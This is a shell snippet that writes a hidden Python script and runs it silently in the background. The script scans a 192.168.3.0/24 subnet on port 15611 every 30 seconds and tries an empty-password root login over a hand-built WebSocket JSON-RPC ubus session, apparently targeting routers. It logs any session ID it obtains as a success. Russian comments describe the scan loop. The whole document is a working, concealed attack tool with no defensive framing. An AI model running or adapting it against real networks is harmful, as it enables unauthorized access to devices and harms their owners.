cat > /opt/.cache/.wstrap.py << 'EOF'
import socket,os,json,time,base64
def try_login(host):
    try:
        s=socket.socket();s.settimeout(6);s.connect((host,15611))
        key=base64.b64encode(os.urandom(16)).decode()
        req="GET / HTTP/1.1\r\nHost: "+host+":15611\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: "+key+"\r\nSec-WebSocket-Version: 13\r\n\r\n"
        s.sendall(req.encode())
        hdr=b""
        try:
            while b"\r\n\r\n" not in hdr: hdr+=s.recv(1024)
        except: return "no-hdr"
        if b"101" not in hdr.split(b"\r\n")[0]: return "not101"
        p=json.dumps({"jsonrpc":"2.0","id":1,"method":"call","params":["00000000000000000000000000000000","session","login",{"username":"root","password":""}]}).encode()
        m=os.urandom(4); h=b"\x81"+bytes([0x80|len(p)])
        s.sendall(h+m+bytes(b^m[i%4] for i,b in enumerate(p)))
        out=b""; end=time.time()+4
        while time.time()<end:
            try:
                s.settimeout(1); d=s.recv(4096)
                if d: out+=d
            except: pass
        s.close()
        if len(out)>2:
            ln=out[1]&0x7f; off=2
            if out[1]&0x80: mk=out[off:off+4]; off+=4
            else: mk=None
            data=out[off:off+ln]
            if mk: data=bytes(b^mk[i%4] for i,b in enumerate(data))
            return data.decode(errors="replace")[:400]
        return "empty"
    except Exception as e: return "err:"+str(e)[:30]
# цикл: каждые 30с скан /24 на 15611, при находке — login
import subprocess
log=open("/tmp/wstrap.out","a",buffering=1)
for cycle in range(120):  # 60 минут
    hosts=[]
    for i in range(1,255):
        try:
            s=socket.socket();s.settimeout(0.3);s.connect(("192.168.3."+str(i),15611));s.close()
            hosts.append("192.168.3."+str(i))
        except: pass
    for h in hosts:
        r=try_login(h)
        log.write(time.ctime()+" "+h+" "+r+"\n")
        if "ubus_rpc_session" in r or "sid" in r:
            log.write("!!! SUCCESS !!!\n")
    time.sleep(30)

EOF
nohup python3 /opt/.cache/.wstrap.py >/dev/null 2>&1 & echo WSTRAP-RUNNING